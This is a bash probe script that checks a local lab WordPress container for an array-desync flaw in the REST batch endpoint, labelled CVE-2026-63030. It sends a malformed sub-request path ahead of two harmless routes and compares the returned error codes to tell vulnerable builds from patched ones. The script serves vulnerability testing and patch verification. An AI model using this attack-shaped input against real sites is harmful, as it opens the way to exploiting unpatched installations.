#!/usr/bin/env bash
# wp2shell probe - SAFE, live, over HTTP against the running lab container.
# Demonstrates the CVE-2026-63030 array desync using only reads: no write, no
# auth bypass exercised, no SQLi, no RCE. Two distinct, harmless routes are
# used as fingerprints so the desync is visible in which ERROR comes back,
# not in any actual side effect.
#
#   /wp/v2/settings                    -> exists, not batch-enabled
#                                          correct answer: rest_batch_not_allowed (400)
#   /wp/v2/this-route-does-not-exist-zz -> does not exist
#                                          correct answer: rest_no_route (404)
#
# Batch sub-requests only accept method POST/PUT/PATCH/DELETE (WordPress's own
# batch/v1 schema enum), so both fingerprint requests use POST.
set -euo pipefail

WP_PORT="${WP_PORT:-8028}"
BASE="http://localhost:${WP_PORT}"
ENDPOINT="${BASE}/?rest_route=/batch/v1"   # this lab runs plain permalinks

req() {
  curl -s -X POST "${ENDPOINT}" -H 'Content-Type: application/json' -d "$1"
}

code_at() { # $1=json $2=index -> .responses[index].body.code
  python3 -c "
import sys,json
d=json.loads(sys.argv[1])
r=d.get('responses',[])
print(r[$2]['body']['code'] if $2 < len(r) else 'MISSING')
" "$1"
}

echo "== 1. CONTROL: settings, then nonexistent-route. No malformed element. =="
CONTROL='{"validation":"normal","requests":[
  {"method":"POST","path":"/wp/v2/settings"},
  {"method":"POST","path":"/wp/v2/this-route-does-not-exist-zz"}
]}'
C_RESP=$(req "${CONTROL}")
C0=$(code_at "${C_RESP}" 0)
C1=$(code_at "${C_RESP}" 1)
echo "  [0] /wp/v2/settings              -> ${C0}  (expected: rest_batch_not_allowed)"
echo "  [1] /wp/v2/this-route-does-not-exist-zz -> ${C1}  (expected: rest_no_route)"
echo

echo "== 2. ATTACK-SHAPED: malformed path FIRST, same two routes after. =="
ATTACK='{"validation":"normal","requests":[
  {"method":"POST","path":"http://:"},
  {"method":"POST","path":"/wp/v2/settings"},
  {"method":"POST","path":"/wp/v2/this-route-does-not-exist-zz"}
]}'
A_RESP=$(req "${ATTACK}")
A0=$(code_at "${A_RESP}" 0)
A1=$(code_at "${A_RESP}" 1)
A2=$(code_at "${A_RESP}" 2)
echo "  [0] malformed path 'http://:'    -> ${A0}  (its own parse error, expected)"
echo "  [1] /wp/v2/settings              -> ${A1}  (expected rest_batch_not_allowed if unaffected)"
echo "  [2] /wp/v2/this-route-does-not-exist-zz -> ${A2}  (expected: rest_no_route)"
echo

if [[ "${A1}" == "rest_no_route" ]]; then
  echo "RESULT: DESYNCED. Index [1] (/wp/v2/settings, a real route) answered with"
  echo "        the error that belongs to index [2] (a route that does not exist)."
  echo "        The malformed sub-request shifted \$matches by one; every request"
  echo "        after it ran against the NEXT request's handler. This is the"
  echo "        vulnerable build (6.9.0-6.9.4 / 7.0.0-7.0.1)."
  echo
  echo "        Apply the real one-line fix and re-run:  ./apply-fix.sh && ./probe.sh"
elif [[ "${A1}" == "rest_batch_not_allowed" ]]; then
  echo "RESULT: ALIGNED. Index [1] answered for itself, matching the control run."
  echo "        This is the patched behaviour (7.0.2 / 6.9.5, or ./apply-fix.sh applied)."
  echo
  echo "        Restore the vulnerable source and re-run:  ./restore-vuln.sh && ./probe.sh"
else
  echo "RESULT: unexpected response code '${A1}' for index [1]. Inspect the raw JSON:"
  echo "${A_RESP}"
fi
